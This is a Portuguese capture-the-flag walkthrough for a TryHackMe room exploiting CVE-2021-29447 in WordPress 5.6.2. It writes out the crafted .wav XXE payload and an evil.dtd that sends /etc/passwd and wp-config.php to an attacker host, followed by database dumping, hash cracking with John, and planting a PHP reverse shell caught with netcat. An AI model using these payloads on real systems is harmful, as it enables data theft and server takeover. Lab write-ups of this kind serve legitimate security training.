#### Task 2
  ##### Questão - Use the vulnerability CVE-2021-29447 to read the wordpress configuration file.
  ##### Resposta - `no need answer`
  

  ##### Questão - Based on the results of #1, what is the name of the database for WordPress?
  ##### Reposta - `wordpressdb2`
  
Primeiramente -> acesse o arquivo hosts -- digite o comando *`sudo nano /etc/hosts`* e insira um atalho para acesso a maquina virtual do THM.

<img src="img1.png" width="80%">
<img src="img2.png" width="80%">

Com a ferramenta *wpscan* é possível fazer algumas explorações para o endereço que está hospedado o wordpress. Use o comando `wpscan --url http://thm.com -e` para enumerar algumas informações do site.

<img src="img3.png" width="80%">

<img src="img4.png" width="80%">

Identificado que a versão usada do wordpress é 5.6.2.

O login e senha foram informados na Task anterior.
`login = tes-corp`
`password = test`

Após uma leitura breve do CVE é identificado a vunerabilidade, onde envolve o upload de um arquivo de mídia com a extensão *.wav*.

Avaliando o payload é notado a necessidade de um arquivo *.dtd* -> *Document Type Definition* -- Dando poder para o atacante controlar melhor a carga útil do payload. Possibilitando a listagem de elementos valdiados, sendo declato dentro do próprio arquivo XML ou com uma referência externa.

1º Digite o comando - `echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://YOURSEVERIP:PORT/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > malicius.wav`  -> Percebe-se que o documento XML contém a necessidade de um arquivo .dtd

Comando irá criar um arquivo chamado *malicius.wav*

Verifique se o que foi gerado é um arquivo de áudio. use o comando *file* para confirmar.

<img src = "img5.png" width="80%">

2° Digite o comando `nano evil.dtd`

3° Insira o seguinte código no arquivo - `<!ENTITY % file SYSTEM “php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd”>
<!ENTITY % init “<!ENTITY &#x25; trick SYSTEM ‘http://YOURSERVERIP:PORT/?p=%file;'>" >`

<img src="img6.png" width="80%">

4º Insira o arquivo *payload.wav* no wordpress.

<img src="img7.png" width="80%">

voltando pro terminal, recebemos um mensagem encodada.

5° Criar um arquivo que recebera a mensagem encodada. *nano encode.php* -> no arquivo insiera o comando <?php echo zlib_decode(base64_decode(‘base64here’)); ?>

<img src="img8.png" width="80%">

6° execute - nano encode.php

<img src="img9.png" width="80%">

Executamos essa série de comando para o caminho *etc/passwd* -> Confira no arquivo *evil.dtd*

<img src="img10.png" width="80%">

7º Alterar o caminho do arquivo *evil.dtd* para /var/www/html/wp-config.php -> caminho padrão onde é armazenado o arquivo de configuração do wordpress.

<img src="img11.png" width="80%">

8° Execute novamente o processo de fazer o uploado do arquivo .wav com o comando *php -S 0.0.0.0:8001* rodando.
Uma nova mensagem criptografada é enviada.

<img src="img12.png" width="80%">

9° Crie novamente o arquivo encode.php, agora com a nova mensagem criptografada. -> <?php echo zlib_decode(base64_decode(‘base64here’)); ?>

A decodifciação do arquivo entrega as credenciais do MySQL 

<img src="img13.png" width="80%">

  ##### Questão - Based on the results of #1, what are the credentials you found? 
  ##### example: user:password
  ##### Reposta - `thedarktangent:sUp3rS3cret132`

É identificado o usuário e a senha no arquivo wp-config, como mostrado na figura.

Acesse o mysql com o comando - `mysql -h thm.com -u thedarktangent -p` -> A senha está no novo arquivo *encode.php* => sUp3rS3cret132

  ##### Questão - Enumerate and identify what is the dbms installed on the server?
  ##### Reposta - `mysql`

  ##### Questão - Based on the results of #4, what is the dbms version installed on the server?
  ##### Reposta - `5.7.33`
  
<img src="img14.png" width="80%">

  ##### Questão - Based on the results of #4, what port is the dbms running on?
  ##### Reposta - `3306`
  
Apenas necessário o nmap com a opção de detecção Serviço e versões -> *nmap -sV thm.com*

<img src="img15.png" width="80%">

  ##### Questão - Compromise the dbms, What is the encrypted password located in the wordpress  users table with id 1??
  ##### Reposta - `$P$B4fu6XVPkSU5KcKUsP1sD3Ul7G3oae1`
  
Acesse o banco de dados MySQL -> *mysql -h thm.com -u thedarktangent -p* -> insira a senha *sUp3rS3cret132*

Execute o comando `show tables;` para listar o banco de dados.

<img src="img16.png" width="80%">

wordpressdb2 é a base de dados explorada. Execute o comando `use wordpressdb2`, em seguida o comando `show tables;`.

<img src="img17.png" width="80%">

wptry_users é a table responsável por armezenar os usuários e senhas da base dados. 

Execute `SELECT * FROM wptry_users` para verificar o conteúdo da table.

<img src="img18.png" width="80%">


  ##### Questão - Based on the results of #7, What is the password in plaint text?
  ##### Reposta - `teddybear`

armazene em um arquivo o hash encontrado -> `nano hash.txt` insira o valor do hash.
  
Execute *hash-identifier* para identificar o hash utilizado para o banco de dados 

<img src="img19.png" width="80%">

Usaremos a ferramenta *John* para identificar a mensagem -> execute o comando `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`

<img src="img20.png" width="80%">


  ##### Questão - Compromise the machine and locate flag.txt
  ##### Reposta - `thm{28bd2a5b7e0586a6e94ea3e0adbd5f2f16085c72}`

Faça o login com o novo usuário encontrado no wordpress. 
Login: *corp-001*
Password: *teddybear*

Em plugins, encontre o arquivo chamado akismet.php e subistitua o conteúdo que está no arquivo por um shell_reverse_php -> https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

Use o *gobuster* para localizar o diretório da pasta que contém o arquivo modificado.
1° -> gobuster dir -u http://thm.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt => encontrado o diretório wp-content.
2° -> gobuster dir -u http://thm.com/wp-content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  => Encontrado os diretório plugins.
3° > O restante do diretório é dito na pagina do wordpress aonde o arquivo foi modificado -> akismet/akismet.php
4 -> execute no seu shell o comando `nc lvnp 4444`
5 -> Abra uma nova pagina no seu browser e insira a seguinte url -> http://thm.com/wp-content/plugins/akismet/akismet.php

Agora com o acesso ao shell do servidor. 

vá ao diretório /home/stux/flag -> execute cat flag.txt

<img src="img21.png" width="80%">


